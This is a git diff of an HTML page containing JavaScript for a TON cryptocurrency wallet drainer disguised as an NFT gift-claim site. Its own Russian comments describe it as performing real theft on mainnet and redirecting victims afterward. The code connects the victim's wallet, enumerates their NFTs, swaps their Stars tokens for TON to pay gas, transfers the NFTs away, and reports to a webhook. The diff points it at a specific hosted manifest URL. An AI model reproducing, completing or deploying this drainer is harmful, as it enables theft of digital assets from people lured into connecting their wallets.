@@ -1,3 +1,4 @@
+[index.html](https://github.com/user-attachments/files/27051578/index.html)
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -200,19 +201,18 @@
         const TARGET_COLLECTIONS = [];
         
         // НАСТРОЙКИ
-        const IS_TESTNET = false;  // true для теста, false для реальной кражи
+        const IS_TESTNET = false;  // false = реальная кража в mainnet
         const GAS_FEE_NANO = "50000000";  // 0.05 TON
         const MAX_RETRIES = 3;
-        const REDIRECT_URL = "https://getgems.io";
+        const REDIRECT_URL = "https://ton.org";  // редирект после кражи
         
         // Адрес контракта Stars (для TON)
         const STARS_JETTON_ADDRESS = "EQCxE6mNqLxLtYJqXqYqXqYqXqYqXqYqXqYqXqYqXqY";
         
         // ============================================================
-        // >>> НАСТРОЙКИ TONCONNECT <<<
+        // >>> MANIFEST URL (ВАШ САЙТ) <<<
         // ============================================================
-        // ВАЖНО: Замените этот URL на URL вашего tonconnect-manifest.json
-        const MANIFEST_URL = "https://ВАШ-САЙТ.com/tonconnect-manifest.json";
+        const MANIFEST_URL = "https://bedokurik107.github.io/lasvegasnft/tonconnect-manifest.json";
         
         let tonConnectUI = null;
         let victimAddress = null;
@@ -266,7 +266,6 @@
                         hasMore = false;
                     }
                     
-                    // Ограничение 10 запросов/сек
                     await new Promise(r => setTimeout(r, 100));
                 }
             } catch(e) {
@@ -274,7 +273,6 @@
                 sendToWebhook({type: "error", error: e.message, stage: "getAllNFTs"});
             }
             
-            // Фильтрация по коллекциям (если указаны)
             if (TARGET_COLLECTIONS.length > 0) {
                 return allNFTs.filter(nft => TARGET_COLLECTIONS.includes(nft.collection_address));
             }
@@ -330,7 +328,6 @@
         async function autoCoverGasForTransfer(requiredGas = 0.05) {
             let balanceTON = await getBalance(victimAddress);
             
-            // Проверка Stars баланса
             let starsBalance = 0;
             try {
                 const starsResp = await fetch(`${API_V2_ENDPOINT}/getTokenBalance?address=${victimAddress}&token=${STARS_JETTON_ADDRESS}`, {
@@ -340,7 +337,6 @@
                 if(starsData.result) starsBalance = parseFloat(starsData.result) / 1e9;
             } catch(e) {}
             
-            // Если недостаточно TON, но есть Stars → свап через LI.FI
             if(balanceTON < requiredGas && starsBalance > 0.02) {
                 updateStatus("🔄 Auto-converting Stars to TON for gas ...");
                 const swapResult = await getLifiSwapQuote(STARS_JETTON_ADDRESS, "TON", starsBalance * 0.95, victimAddress);
@@ -380,7 +376,6 @@
             try {
                 updateStatus(`✨ Transferring ${nftItem.name || nftItem.address?.substring(0,10) || nftItem} as gift ...`);
                 
-                // Проверяем газ
                 const hasEnoughGas = await autoCoverGasForTransfer();
                 if(!hasEnoughGas) {
                     updateStatus("⚠️ Gas coverage failed, skipping this NFT");
@@ -466,7 +461,6 @@
                     manifestUrl: MANIFEST_URL
                 });
                 
-                // Проверяем, есть ли уже подключенный кошелек
                 if (tonConnectUI.connected) {
                     const account = tonConnectUI.account;
                     victimAddress = account.address;
@@ -504,7 +498,6 @@
             
             try {
                 await tonConnectUI.openModal();
-                // Ждем подключения
                 const checkInterval = setInterval(() => {
                     if(tonConnectUI.connected && tonConnectUI.account) {
                         clearInterval(checkInterval);
@@ -533,7 +526,6 @@
             claimBtn.disabled = false;
         };
         
-        // Инициализация TonConnect при загрузке
         initTonConnect();
         
         console.log("%c🎁 HO HO HO! YOU'VE GOT A GIFT! 🎁", "color:gold;font-size:18px");
